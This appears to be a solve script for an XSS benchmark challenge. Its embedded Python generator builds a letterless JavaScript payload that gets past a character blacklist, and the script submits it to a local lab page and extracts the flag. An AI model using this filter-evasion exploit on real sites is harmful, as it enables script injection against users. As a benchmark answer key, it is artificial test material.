#!/usr/bin/env bash
# XBEN-010-24 — "Dalgona Challenges", umbrella (tags: xss)
#
# The blacklist here is every letter, every digit, `<` and `>`. The value is
# written into JavaScript — `var name = "…";` — so there is no tag to open and
# nothing to escape from except the string, and the code that follows may not
# contain a single letter.
#
# JavaScript will still evaluate it. `![]` is false, `+[]` is zero, and adding
# `[]` to either turns it into the *text* "false" or "0", which can be indexed
# for its characters. That gives a, b, c, d, e, f, i, j, l, n, o, r, s, t, u and
# a space, which is enough to spell "filter" and "constructor" — and
# `[]["filter"]["constructor"]` is the `Function` constructor, which will build
# any function whose name can be spelled.
#
# Two characters are not reachable that way and both are needed:
#
#   * `/`, because no string in reach contains one. `"false".fontcolor()`
#     returns `<font color="undefined">false</font>`, and that closing tag has
#     one.
#   * `p`, because `escape` and `unescape` both need it. With a `/` a regular
#     expression can be built, and `RegExp`'s own name — "function RegExp() {
#     [native code] }" — is the only string in reach that holds a `p`.
#
# After that `escape(" ")` is "%20", whose first character is the per-cent sign,
# and `unescape("%58%53%53")` is "XSS": three characters that could not be
# typed, spelled out of a numeric escape.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
H5I="${H5I:-h5i}"
SESSION="xben010-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

payload="$(python3 - <<'PY'
def num(k):
    if k == 0:
        return "+[]"
    if k == 1:
        return "+!+[]"
    return "+".join(["!+[]"] * k)

def numstr(k):
    return "(" + num(k) + "+[])"

def at(expr, k):
    return expr + "[" + num(k) + "]"

FALSE = "(![]+[])"        # "false"
TRUE = "(!![]+[])"        # "true"
UNDEF = "([][[]]+[])"     # "undefined"
OBJ = "([]+{})"           # "[object Object]"

ch = {
    "f": at(FALSE, 0), "a": at(FALSE, 1), "l": at(FALSE, 2),
    "s": at(FALSE, 3), "e": at(FALSE, 4),
    "t": at(TRUE, 0), "r": at(TRUE, 1), "u": at(TRUE, 2),
    "n": at(UNDEF, 1), "d": at(UNDEF, 2), "i": at(UNDEF, 5),
    "o": at(OBJ, 1), "b": at(OBJ, 2), "j": at(OBJ, 3),
    "c": at(OBJ, 5), " ": at(OBJ, 7),
}

def word(text):
    return "+".join(ch[c] for c in text)

FUNCTION = "[][" + word("filter") + "][" + word("constructor") + "]"

# `<font color="undefined">false</font>`: the only `/` within reach.
TAG = FALSE + "[" + word("fontcolor") + "]()"
SLASH = at(TAG, 30)

# A regular expression built only so its constructor can be named:
# "function RegExp() { [native code] }" is where the `p` comes from.
REGEX = FUNCTION + "(" + word("return") + "+" + SLASH + "+" + FALSE + "+" + SLASH + ")()"
REGEXP_NAME = "(" + REGEX + "[" + word("constructor") + "]+[])"
ch["p"] = at(REGEXP_NAME, 14)

def call(name):
    return FUNCTION + "(" + word("return ") + "+" + word(name) + ")()"

PERCENT = at(call("escape") + "(" + ch[" "] + ")", 0)
XSS = "+".join([PERCENT, numstr(5), numstr(8),
                PERCENT, numstr(5), numstr(3),
                PERCENT, numstr(5), numstr(3)])

# Close the string the server opened, then run, then comment out its remains.
print('";' + call("alert") + "(" + call("unescape") + "(" + XSS + "))" + "//")
PY
)"

"$H5I" browser open "$URL/page" --session "$SESSION" --new --capture >/dev/null
seq="$("$H5I" websec replay req_0 --create \
    --set 'method=POST' --set "form.name=$payload" \
    --session "$SESSION" | python3 -c 'import json,sys; print(json.load(sys.stdin)["seq"])')"
"$H5I" websec show "res_$seq" --session "$SESSION" |
    python3 -c 'import re,sys; m=re.search(r"FLAG\{[a-f0-9]{64}\}", sys.stdin.read()); print(m.group(0) if m else "no flag found")'
